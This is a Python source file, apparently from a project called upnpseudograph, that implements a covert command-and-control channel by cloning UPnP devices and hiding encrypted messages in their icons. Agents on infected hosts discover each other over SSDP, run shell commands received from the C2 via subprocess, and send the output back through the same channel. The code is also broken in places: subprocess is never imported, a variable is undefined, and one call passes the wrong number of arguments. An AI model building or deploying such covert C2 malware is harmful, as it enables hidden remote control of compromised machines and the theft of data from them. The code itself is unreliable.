"""A covert channel implementation which embeds data into UPNP device icons
"""
import argparse
import logging
import os
import queue
import sys
import threading
import time
import typing

import requests
import xmltodict

from upnpseudograph import secret_pixel
from upnpseudograph import ssdp
from upnpseudograph import upnp
from upnpseudograph import utils

log = logging.getLogger(__name__)


SEARCH_FREQUENCY = 5


class UPNPAgent:
    """A C2 for cloning UPNP devices and embedding payloads in UPNP icons
    """
    def __init__(
        self,
        preferred_devices=None,
        is_c2=False, passthrough=True,
        search_frequency=30
    ) -> None:
        """A client/server class for a UPNP based covert channel.
        
        This class provides a covert channel by embedding encrypted covert data
        into icons for UPNP devices. it supports a client/server model where an
        instance can be marked as the C2 server that an attacker can queue
        messages to other infected devices and issue commands to. Devices will
        utilize SSDP calls to discover and communicate bi-directionally.

        Parameters
        ----------
        is_c2 : bool, optional
            Flag to note that this is a C2 for the other devices, by default False
        passthrough: bool, default True
            If set to True, no cached responses are used and all requests are
            forwarded to the cloned device. This reduces risk of DoS of cloned
            device but potentially increases detectability.
        """
        preferred_devices = (
            [upnp.UPNPDevice] if preferred_devices is None else preferred_devices
        )
        self.is_c2 = is_c2
        self.private_key = utils.generate_rsa()
        self.public_key = self.private_key.public_key()
        self.target_device = None
        self.message_queue = queue.Queue()
        self.oversized_queue = queue.Queue()
        self.host_ip = utils.get_host_ip_address()
        self.agents = {}
        self.agent_messages = {}
        try:
            for upnp_device in preferred_devices:
                device = upnp_device(
                    passthrough=passthrough,
                    public_key=self.public_key,
                    message_queue=self.message_queue,
                    oversized_queue=self.oversized_queue
                )
                if device.target_root_device:
                    self.target_device = device
                    break
        except Exception as e:  # pylint: disable=W0612,W0718
            logging.error(
                "Could not find %s device on network.",
                self.target_device, exc_info=sys.exc_info
            )
            os._exit(1)
        threading.Thread(target=self._start_agent_search).start()

    def queue_message(self, target_ip, command, message):
        """Queues a message to send to a specific IP

        Args:
            target_ip (str): target ip to send message to
            command (bytes): b'm' for message, b'c' for command
            message (bytes): The message in bytes
        """
        public_key = self.agents.get(target_ip)
        if public_key:
            message_mapping = self.agent_messages.get(target_ip,{})
            message_index = len(message_mapping)
            message_bytes = (
                command + message
            )
            message_mapping[message_index] = {
                'message': message_bytes,
            }
            self.message_queue.put(
                (target_ip, public_key, message_bytes)
            )
            self.agent_messages[target_ip] = message_mapping

    def process_message(self, agent_ip: str, message: bytes):
        print(message)
        command = message[0]
        message_content = message[1:]
        if self.is_c2:
            if agent_ip in self.agents:
                print(f"MESSAGE {agent_ip}: {message_content}")
                open('message_history.txt', 'a+', encoding='utf8').write(f"{agent_ip}:{message_index} -> {message_content}\n")
        elif not self.is_c2:
            if command == ord('c'):
                command_args = message_content.decode('utf8').split()
                process = subprocess.Popen(command_args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
                stdout, stderr = process.communicate()
                self.queue_message((stdout + "\n" + stderr + "\n").encode('utf8'))
            elif command == ord('m'):
                log.info("Received C2 Message %s", message_content.decode('utf8'))
            

    def _start_agent_search(self):
        while True:
            devices = ssdp.discover_ssdp_devices(
                ssdp_filter=self.target_device.ssdp_filter
            )
            for ip, services in devices.items():
                for st, service in services.items():
                    if ip == self.host_ip:
                        continue
                    try:
                        location = service.get('location')
                        ip, port = utils.extract_ip_port(location)
                        if location:
                            response = requests.get(location, timeout=10)
                            response.raise_for_status()
                            xml_dict = xmltodict.parse(response.text)
                            icons = xml_dict.get(
                                'root', {}
                            ).get(
                                'device', {}
                            ).get(
                                'iconList', {}
                            ).get(
                                'icon', []
                            )
                            # Correct if xmltodict returns a single icon and a list
                            icons = icons if isinstance(icons, typing.List) else [icons]
                            icon_paths = [icon['url'] for icon in icons if 'url' in icon]
                            for icon_path in icon_paths:
                                try:
                                    icon_full_path = f"http://{ip}:{port}/{icon_path}"
                                    icon_response = requests.get(
                                        icon_full_path, timeout=10)
                                    icon_response.raise_for_status()
                                    content = icon_response.content
                                    try:
                                        # See if it's a new agent
                                        n_bytes = secret_pixel.extract_bytes(content)
                                        if n_bytes and len(n_bytes) == utils.RSA_BIT_STRENGTH // 8:
                                            public_key = utils.public_key_from_n(n_bytes)
                                            self.agents[ip] = public_key
                                            print("Found agent at %s.", ip)                         
                                    except Exception as e:
                                        log.error("1Error %s reading message from %s", e, ip)
                                    if ip in self.agents:
                                        try:
                                            message = secret_pixel.extract_bytes(content, self.private_key)
                                            if message:
                                                self.process_message(ip, message)
                                        except Exception as e:
                                            log.error("2Error %s reading message from  agent %s", e, ip)
                                except requests.HTTPError as e:
                                    log.info("Failed to get %s, skipping: %s", icon_full_path, e)
                                except Exception as e: # pylint: disable=W0718
                                    log.info("No message found in %s, skipping: %s", icon_full_path, e)
                    except requests.HTTPError:
                        pass
            time.sleep(SEARCH_FREQUENCY)
